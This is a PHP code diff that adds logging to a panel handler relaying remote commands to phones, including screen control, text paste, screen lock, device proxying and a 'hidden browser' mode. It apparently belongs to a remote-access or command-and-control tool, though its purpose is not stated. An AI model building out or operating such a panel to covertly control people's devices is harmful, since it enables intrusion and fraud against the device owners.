@@ -95,6 +95,8 @@ final class PanelHandler
     {
         $command = $message->getString('comand');
 
+        $this->logScreenCommand($phoneId, $command, $message);
+
         $deviceData = match ($command) {
             'block' => [
                 'type' => 'screen',
@@ -110,7 +112,7 @@ final class PanelHandler
             'mov' => [
                 'type' => 'screen',
                 'subc' => 'mov',
-                'poi' => $message->getString('poi'),
+                'poi' => $message->get('poi', ''),
                 'movetype' => $message->getString('movetype'),
             ],
             'snap' => [
@@ -176,6 +178,7 @@ final class PanelHandler
     private function handleBrowserCommand(string $phoneId, WebSocketMessage $message): void
     {
         $btype = $message->getString('btype', 'n');
+        $this->logOperation("browser:{$btype}", $phoneId);
 
         // Node.js: h=hidden browser, n=normal browser - different field structures
         $deviceData = match ($btype) {
@@ -202,6 +205,7 @@ final class PanelHandler
     private function handleProxyCommand(string $phoneId, WebSocketMessage $message): void
     {
         $prxcom = $message->getString('prxcom');
+        $this->logOperation("proxy:{$prxcom}", $phoneId);
 
         // Convert ON/OFF to 1/0 as per Node.js protocol
         $subc = match ($prxcom) {
@@ -222,6 +226,7 @@ final class PanelHandler
 
     private function handleFetchCommand(string $phoneId, WebSocketMessage $message): void
     {
+        $this->logOperation('fetch', $phoneId);
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'fetch',
@@ -234,6 +239,7 @@ final class PanelHandler
     {
         $command = $message->getString('comand');
         $action = $message->getString('act');
+        $this->logOperation("broadcast:{$command}", $phoneId);
 
         // Map action string to number as per Node.js protocol
         $actionNum = match ($action) {
@@ -314,6 +320,45 @@ final class PanelHandler
         unset($deviceData['itype'], $deviceData['pid']);
 
         $this->connectionManager->sendToDevice($phoneId, $deviceData);
+    }
+
+    private function logScreenCommand(string $phoneId, string $command, WebSocketMessage $message): void
+    {
+        if (! config('websocket.logging.enabled', true)) {
+            return;
+        }
+
+        $context = ['phone_id' => $phoneId, 'comand' => $command];
+
+        $context = match ($command) {
+            'mov' => array_merge($context, [
+                'movetype' => $message->getString('movetype'),
+                'poi' => is_array($message->get('poi'))
+                    ? json_encode($message->get('poi'))
+                    : $message->getString('poi'),
+            ]),
+            'nav' => array_merge($context, [
+                'navshort' => $message->getString('navshort'),
+            ]),
+            'vol' => array_merge($context, [
+                'volstate' => $message->getString('volstate'),
+            ]),
+            'kb' => array_merge($context, [
+                'kbstate' => $message->getString('kbstate'),
+            ]),
+            'paste' => array_merge($context, [
+                'txt_length' => strlen($message->getString('txt')),
+            ]),
+            'L' => array_merge($context, [
+                'lockit' => $message->getString('lockit'),
+            ]),
+            'q' => array_merge($context, [
+                'quality' => $message->getString('newqulity'),
+            ]),
+            default => $context,
+        };
+
+        WebSocketLog::getLogger()->info('Panel screen command', $context);
     }
 
     private function logOperation(string $logType, string $phoneId): void
